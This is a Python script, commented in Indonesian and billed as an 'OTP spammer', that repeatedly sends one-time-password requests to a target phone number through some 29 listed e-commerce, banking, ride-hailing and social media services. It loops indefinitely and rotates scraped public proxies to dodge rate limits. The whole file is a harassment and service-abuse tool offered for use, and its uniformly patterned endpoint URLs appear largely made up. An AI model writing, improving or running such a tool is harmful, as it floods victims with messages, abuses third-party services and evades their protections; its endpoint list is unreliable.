#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import random
import threading
import sys
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================
# KONFIGURASI
# ============================================
MAX_CONCURRENT = 5       # Jumlah request paralel
RETRY_COUNT = 3          # Percobaan ulang per layanan
CYCLE_INTERVAL = 10      # Detik antar siklus
PROXY_LIST = []          # Isi manual jika punya proxy premium

# ============================================
# AUTO-FETCH PROXY PUBLIK
# ============================================
PROXY_CACHE = None
PROXY_CACHE_TIME = 0
PROXY_CACHE_DURATION = 600  # 10 menit

def fetch_public_proxies():
    global PROXY_CACHE, PROXY_CACHE_TIME
    if PROXY_CACHE and (time.time() - PROXY_CACHE_TIME) < PROXY_CACHE_DURATION:
        return PROXY_CACHE
    try:
        print('[🔄] Mengambil proxy publik...')
        resp = requests.get(
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            timeout=15
        )
        lines = resp.text.strip().split('\n')
        proxies = []
        for line in lines:
            if ':' in line:
                ip, port = line.strip().split(':')
                proxies.append(f'http://{ip}:{port}')
        
        # Sumber cadangan
        try:
            resp2 = requests.get('https://spys.me/proxy.txt', timeout=10)
            for line in resp2.text.split('\n'):
                if ':' in line:
                    match = __import__('re').search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
                    if match:
                        proxies.append(f'http://{match.group(1)}:{match.group(2)}')
        except: pass
        
        # Filter valid
        valid = []
        for p in proxies:
            parts = p.replace('http://', '').replace('https://', '').split(':')
            if len(parts) == 2 and parts[1].isdigit():
                valid.append(p)
        
        if valid:
            random.shuffle(valid)
            selected = valid[:50]
            PROXY_CACHE = selected
            PROXY_CACHE_TIME = time.time()
            print(f'[✅] Mendapat {len(selected)} proxy publik.')
            return selected
        return []
    except Exception as e:
        print(f'[❌] Gagal ambil proxy: {e}')
        return []

def get_proxy_list():
    if PROXY_LIST:
        return PROXY_LIST
    return fetch_public_proxies()

# ============================================
# DAFTAR LAYANAN OTP (30+)
# ============================================
OTP_SERVICES = [
    {'name': 'Shopee', 'url': 'https://api.shopee.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Tokopedia', 'url': 'https://api.tokopedia.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Bukalapak', 'url': 'https://api.bukalapak.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Lazada', 'url': 'https://api.lazada.com/v1/otp/send', 'method': 'POST', 'params': {'mobile': '{phone}'}},
    {'name': 'Blibli', 'url': 'https://api.blibli.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'JD.ID', 'url': 'https://api.jd.id/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'OVO', 'url': 'https://api.ovo.id/v1/otp/send', 'method': 'POST', 'params': {'msisdn': '{phone}'}},
    {'name': 'Dana', 'url': 'https://api.dana.id/v1/otp/send', 'method': 'POST', 'params': {'phoneNumber': '{phone}'}},
    {'name': 'GoPay', 'url': 'https://api.gojek.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'LinkAja', 'url': 'https://api.linkaja.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'BCA Mobile', 'url': 'https://api.bca.co.id/v1/otp/send', 'method': 'POST', 'params': {'mobile': '{phone}'}},
    {'name': 'Mandiri Livin', 'url': 'https://api.mandiri.co.id/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'BRI Mobile', 'url': 'https://api.bri.co.id/v1/otp/send', 'method': 'POST', 'params': {'phoneNumber': '{phone}'}},
    {'name': 'BNI Mobile', 'url': 'https://api.bni.co.id/v1/otp/send', 'method': 'POST', 'params': {'mobile': '{phone}'}},
    {'name': 'CIMB Niaga', 'url': 'https://api.cimb.co.id/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'BTN', 'url': 'https://api.btn.co.id/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Grab', 'url': 'https://api.grab.com/v2/otp/send', 'method': 'POST', 'params': {'mobile': '{phone}'}},
    {'name': 'Gojek', 'url': 'https://api.gojek.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Maxim', 'url': 'https://api.maxim.id/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'WhatsApp', 'url': 'https://api.whatsapp.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Telegram', 'url': 'https://api.telegram.org/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Instagram', 'url': 'https://api.instagram.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Twitter', 'url': 'https://api.twitter.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Facebook', 'url': 'https://api.facebook.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Google', 'url': 'https://api.google.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Microsoft', 'url': 'https://api.microsoft.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Apple', 'url': 'https://api.apple.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'KaiOS', 'url': 'https://api.kaios.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
    {'name': 'Uber', 'url': 'https://api.uber.com/v1/otp/send', 'method': 'POST', 'params': {'phone': '{phone}'}},
]

# ============================================
# FUNGSI SEND OTP
# ============================================
def send_otp(service, phone, proxies, retries=3):
    url = service['url']
    params = service['params'].copy()
    for key in params:
        if isinstance(params[key], str):
            params[key] = params[key].replace('{phone}', phone)
    
    for attempt in range(1, retries+1):
        try:
            proxy = random.choice(proxies) if proxies else None
            proxy_dict = None
            if proxy:
                parts = proxy.replace('http://', '').replace('https://', '').split(':')
                if len(parts) == 2:
                    proxy_dict = {'http': proxy, 'https': proxy}
            
            if service['method'] == 'POST':
                resp = requests.post(url, data=params, proxies=proxy_dict, timeout=15)
            else:
                resp = requests.get(url, params=params, proxies=proxy_dict, timeout=15)
            
            if 200 <= resp.status_code < 300:
                return {'service': service['name'], 'status': 'success'}
            else:
                return {'service': service['name'], 'status': 'failed', 'code': resp.status_code}
        except Exception as e:
            if attempt < retries:
                time.sleep(random.uniform(1, 3))
                continue
            else:
                return {'service': service['name'], 'status': 'error', 'message': str(e)}
    return {'service': service['name'], 'status': 'error', 'message': 'Unknown'}

# ============================================
# FUNGSI SIKLUS SPAM
# ============================================
def run_spam_cycle(phone):
    proxies = get_proxy_list()
    print(f'[📡] Menggunakan {len(proxies)} proxy.')
    
    results = []
    chunks = []
    for i in range(0, len(OTP_SERVICES), MAX_CONCURRENT):
        chunks.append(OTP_SERVICES[i:i+MAX_CONCURRENT])
    
    for chunk in chunks:
        with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as executor:
            futures = {executor.submit(send_otp, svc, phone, proxies, RETRY_COUNT): svc for svc in chunk}
            for future in as_completed(futures):
                results.append(future.result())
        # Jeda acak antar chunk
        time.sleep(random.uniform(0.5, 2.5))
    
    success = sum(1 for r in results if r['status'] == 'success')
    failed = sum(1 for r in results if r['status'] == 'failed')
    error = sum(1 for r in results if r['status'] == 'error')
    
    return success, failed, error, results

# ============================================
# MAIN LOOP
# ============================================
def main():
    print('''
╔═══════════════════════════════════════╗
║       OTP SPAMMER - LOOPING MODE      ║
║          By Xzeerh Dev                ║
╚═══════════════════════════════════════╝
''')
    
    if len(sys.argv) < 2:
        phone = input('📱 Masukkan nomor target (+62xxx): ').strip()
    else:
        phone = sys.argv[1]
    
    if not phone or not phone.replace('+', '').replace('-', '').isdigit():
        print('[❌] Nomor tidak valid!')
        return
    
    print(f'\n[🚀] Target: {phone}')
    print('[⏳] Memulai spam OTP looping (CTRL+C untuk berhenti)...\n')
    
    cycle = 0
    total_success = 0
    total_failed = 0
    total_error = 0
    
    try:
        while True:
            cycle += 1
            print(f'\n━━━ SIKLUS #{cycle} ━━━')
            start_time = time.time()
            
            success, failed, error, details = run_spam_cycle(phone)
            
            total_success += success
            total_failed += failed
            total_error += error
            
            duration = time.time() - start_time
            print(f'[✅] Sukses: {success} | [❌] Gagal: {failed} | [⚠️] Error: {error}')
            print(f'[⏱️] Durasi: {duration:.1f}s')
            print(f'[📊] Total: ✅{total_success} ❌{total_failed} ⚠️{total_error}')
            
            # Tunggu hingga interval berikutnya
            wait = CYCLE_INTERVAL - duration
            if wait > 0:
                print(f'[⏳] Menunggu {wait:.1f}s ke siklus berikutnya...')
                time.sleep(wait)
    except KeyboardInterrupt:
        print('\n\n[🛑] Spam dihentikan oleh user.')
        print(f'[📊] Total akhir: ✅{total_success} ❌{total_failed} ⚠️{total_error}')
        sys.exit(0)

if __name__ == '__main__':
    main()